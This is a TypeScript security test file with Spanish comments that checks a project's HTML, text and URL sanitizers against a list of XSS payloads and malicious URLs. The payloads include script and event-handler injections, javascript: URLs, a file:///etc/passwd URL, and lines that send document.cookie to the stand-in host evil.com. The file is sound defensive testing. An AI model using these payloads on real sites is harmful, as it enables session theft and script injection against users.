import { containsScript, sanitizeHTML, sanitizeText, sanitizeURL } from '@/lib/security';

// Payloads de prueba para XSS
const XSS_PAYLOADS = [
  // Scripts básicos
  '<script>alert("XSS")</script>',
  '<script src="http://evil.com/script.js"></script>',
  '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
  
  // Event handlers
  '<img src="x" onerror="alert(\'XSS\')">',
  '<div onmouseover="alert(\'XSS\')">Hover me</div>',
  '<input onfocus="alert(\'XSS\')" autofocus>',
  
  // JavaScript URLs
  'javascript:alert("XSS")',
  'javascript:document.location="http://evil.com"',
  'data:text/html,<script>alert("XSS")</script>',
  
  // Iframes maliciosos
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
  
  // VBScript
  '<script language="VBScript">MsgBox "XSS"</script>',
  
  // Encodings
  '&#60;script&#62;alert("XSS")&#60;/script&#62;',
  '%3Cscript%3Ealert("XSS")%3C/script%3E',
  
  // CSS injection
  '<style>@import "javascript:alert(\'XSS\')";</style>',
  '<div style="background:url(javascript:alert(\'XSS\'))">',
  
  // Meta refresh
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
  
  // Object tags
  '<object data="javascript:alert(\'XSS\')"></object>',
  '<embed src="javascript:alert(\'XSS\')">',
  
  // SVG
  '<svg onload="alert(\'XSS\')"><circle cx="50" cy="50" r="40"/></svg>',
  
  // Form injection
  '<form action="javascript:alert(\'XSS\')"><input type="submit" value="Click me"></form>',
  
  // Link injection
  '<a href="javascript:alert(\'XSS\')">Click me</a>',
  
  // Mixed content
  '<p>Normal text <script>alert("XSS")</script> more text</p>',
  'Hello <img src="x" onerror="alert(\'XSS\')"> World',
];

// URLs maliciosas
const MALICIOUS_URLS = [
  'javascript:alert("XSS")',
  'data:text/html,<script>alert("XSS")</script>',
  'vbscript:MsgBox "XSS"',
  'file:///etc/passwd',
  'ftp://evil.com/script.js',
  'http://evil.com/steal?cookie=' + (typeof document !== 'undefined' ? encodeURIComponent(document.cookie) : 'test'),
];

// Contenido seguro para comparar
const SAFE_CONTENT = [
  'Hello World',
  '<p>This is safe HTML</p>',
  '<strong>Bold text</strong>',
  '<a href="https://example.com">Safe link</a>',
  'user@example.com',
  '+1-555-123-4567',
];

export function runSecurityTests() {
  console.log('🔒 Iniciando pruebas de seguridad XSS...\n');
  
  let passedTests = 0;
  let totalTests = 0;
  
  // Test 1: Sanitización de HTML
  console.log('📋 Test 1: Sanitización de HTML');
  XSS_PAYLOADS.forEach((payload, index) => {
    totalTests++;
    const sanitized = sanitizeHTML(payload);
    const isSafe = !containsScript(sanitized) && !sanitized.includes('javascript:');
    
    if (isSafe) {
      passedTests++;
      console.log(`  ✅ Payload ${index + 1}: BLOQUEADO`);
    } else {
      console.log(`  ❌ Payload ${index + 1}: VULNERABLE`);
      console.log(`     Original: ${payload}`);
      console.log(`     Sanitized: ${sanitized}`);
    }
  });
  
  // Test 2: Sanitización de texto
  console.log('\n📋 Test 2: Sanitización de texto');
  XSS_PAYLOADS.forEach((payload, index) => {
    totalTests++;
    const sanitized = sanitizeText(payload);
    const isSafe = !containsScript(sanitized) && !sanitized.includes('javascript:');
    
    if (isSafe) {
      passedTests++;
      console.log(`  ✅ Payload ${index + 1}: BLOQUEADO`);
    } else {
      console.log(`  ❌ Payload ${index + 1}: VULNERABLE`);
      console.log(`     Original: ${payload}`);
      console.log(`     Sanitized: ${sanitized}`);
    }
  });
  
  // Test 3: Sanitización de URLs
  console.log('\n📋 Test 3: Sanitización de URLs');
  MALICIOUS_URLS.forEach((url, index) => {
    totalTests++;
    const sanitized = sanitizeURL(url);
    const isSafe = sanitized === '' || sanitized.startsWith('https://') || sanitized.startsWith('http://');
    
    if (isSafe) {
      passedTests++;
      console.log(`  ✅ URL ${index + 1}: BLOQUEADA`);
    } else {
      console.log(`  ❌ URL ${index + 1}: VULNERABLE`);
      console.log(`     Original: ${url}`);
      console.log(`     Sanitized: ${sanitized}`);
    }
  });
  
  // Test 4: Contenido seguro no debe ser alterado
  console.log('\n📋 Test 4: Contenido seguro');
  SAFE_CONTENT.forEach((content, index) => {
    totalTests++;
    const sanitized = sanitizeText(content);
    const isUnchanged = sanitized === content || sanitized.includes(content);
    
    if (isUnchanged) {
      passedTests++;
      console.log(`  ✅ Contenido ${index + 1}: PRESERVADO`);
    } else {
      console.log(`  ⚠️ Contenido ${index + 1}: ALTERADO`);
      console.log(`     Original: ${content}`);
      console.log(`     Sanitized: ${sanitized}`);
    }
  });
  
  // Test 5: Detección de scripts
  console.log('\n📋 Test 5: Detección de scripts');
  XSS_PAYLOADS.forEach((payload, index) => {
    totalTests++;
    const hasScript = containsScript(payload);
    
    if (hasScript) {
      passedTests++;
      console.log(`  ✅ Payload ${index + 1}: DETECTADO`);
    } else {
      console.log(`  ❌ Payload ${index + 1}: NO DETECTADO`);
      console.log(`     Content: ${payload}`);
    }
  });
  
  // Resumen
  console.log('\n📊 Resumen de Pruebas');
  console.log(`Total de pruebas: ${totalTests}`);
  console.log(`Pruebas exitosas: ${passedTests}`);
  console.log(`Pruebas fallidas: ${totalTests - passedTests}`);
  console.log(`Tasa de éxito: ${((passedTests / totalTests) * 100).toFixed(1)}%`);
  
  if (passedTests === totalTests) {
    console.log('\n🎉 ¡Todas las pruebas de seguridad pasaron!');
  } else {
    console.log('\n⚠️ Algunas pruebas fallaron. Revisa la configuración de seguridad.');
  }
  
  return {
    total: totalTests,
    passed: passedTests,
    failed: totalTests - passedTests,
    successRate: (passedTests / totalTests) * 100
  };
}

// Función para testing en desarrollo
export function testSecurityInDev() {
  if (import.meta.env.DEV) {
    console.log('🔒 Ejecutando pruebas de seguridad en modo desarrollo...');
    runSecurityTests();
  }
}

// Auto-ejecutar en desarrollo
if (import.meta.env.DEV) {
  // Ejecutar después de un pequeño delay para que la app se cargue
  setTimeout(() => {
    testSecurityInDev();
  }, 1000);
} 